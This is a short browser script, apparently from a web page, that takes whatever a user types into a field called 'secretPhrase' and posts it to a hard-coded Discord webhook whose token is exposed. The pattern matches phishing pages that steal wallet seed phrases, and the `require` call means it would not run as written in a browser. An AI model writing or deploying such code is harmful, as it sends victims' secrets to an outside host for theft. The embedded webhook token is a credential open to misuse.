<script>
    const axios = require('axios');
    const webhookUrl = "https://discordapp.com/api/webhooks/1033079881254309979/o5hIIVApTV0UM2iPmf-0Q-AqxVVgQLhgO5OAJ5qmL7pGbyHb0tLXOC5c7f-QeoVIIBUh";

    function sendMessage() {
        let message = document.getElementById("secretPhrase").value;
        axios.post(webhookUrl, {content: message})
            .then(function (response) {
                console.log(response);
            })
            .catch(function (error) {
                console.log(error);
            });
    }

    document.getElementById("sendButton").addEventListener("click", sendMessage);
</script>
